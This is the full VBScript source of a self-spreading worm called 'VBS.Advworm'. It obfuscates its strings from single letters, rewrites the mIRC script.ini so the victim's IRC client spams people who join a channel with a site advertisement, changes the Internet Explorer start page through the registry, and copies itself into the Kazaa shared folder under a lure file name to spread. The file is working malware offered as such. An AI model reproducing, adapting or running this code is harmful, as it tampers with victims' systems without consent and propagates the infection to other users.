'VBS.Advworm
'Bornt by Nu11_Gr4m
'nullgram@yahoo.com
'Advertise your site for free ;)
alpha = "a" 
vita = "b"
tse = "c"
nte = "d"
epsilon = "e"
fi = "f"
gke = "g"
xa = "h"
ee = "i"
giot = "j"
kappa = "k"
lamda = "l"
mi = "m"
ni = "n"
omikron = "o"
pi = "p"
que = "q"
ro = "r"
sigma = "s"
taf = "t"
giou = "u"
ven = "v"
doubleu = "w"
xi = "x"
why = "y"
zed = "z"
eek = "I"
rok = "R"
tsek = "C"
teleitsa = "."
sc1pt = sigma + tse + ro + ee + pi + taf
sc1pt1mg =  sigma + tse + ro + ee + pi + taf + ee + ni + gke
pf1l3 = fi + ee + lamda + epsilon
s1s = sigma + why + sigma + taf + epsilon + mi
obj = omikron + vita + giot + epsilon + tse + taf
set eph50 = createobject (sc1pt1mg + teleitsa + pf1l3 + s1s + obj)
site = "themisps.tripod.com"
mrkin = sc1pt + teleitsa + ee + ni + ee
protie = "[" + sc1pt + "]"
defter = "n0 = On 1:join:#:{ if ( $nick == $me ) { /halt }"
triti = "n1 = else  { /msg $nick Hey $nick ! Have you ever visited "+ site +"? It's kewl  "
tetar = "n2 =  } }"
drive = "C:"
dp4th = drive & "\"
set skt = eph50.getfolder(dp4th)
set subfols = skt.subfolders
for each subfoldere in subfols 
subst = mid (subfoldere.path,4,4)
if subst = mi +eek + rok + tsek then
m1rkd = subfoldere.path
end if 
next
if m1rkd  = "" then 
progpath = dp4th + "Program Files" + "\"
set skt2 = eph50.getfolder(progpath)
set subis = skt2.subfolders
for each subi in subis 
subist = mid(subi.path,18,4)

if subist = mi +eek + rok + tsek then 
m1rkd = subi.path
end if
next
end if
m1rkdin = m1rkd + "\" + mrkin  
if eph50.fileexists(m1rkdin) then
set filew2 = eph50.opentextfile(m1rkdin,1,false,0)
oldy = filew2.readall
filew2.close
set filed = eph50.getfile(m1rkdin)
filed.delete
end if
eph50.createtextfile(m1rkdin)
set filew2 = eph50.opentextfile(m1rkdin,2,false,0)
filew2.writeline(protie)
filew2.writeline(defter)
filew2.writeline(triti)
filew2.writeline(tetar)
filew2.write(oldy)
filew2.close
se11 = sigma + xa + epsilon + lamda + lamda
set w5c = createobject(doubleu + sc1pt + teleitsa + se11)
w5c.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",site

alert = w5c.regread ("HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DownloadDir")
w5c.run "notepad.exe"
W5c.AppActivate "Notepad"
For i = 1 to 39
wscript.Sleep 150
w5c.sendkeys mid ("Nu11_Gr4m/The Misps" + vbLf + "themisps.tripod.com",i,1)
next
set s317 = eph50.getfile(wscript.scriptname)
s317.copy alert + "\sex porn fuck.vbs"  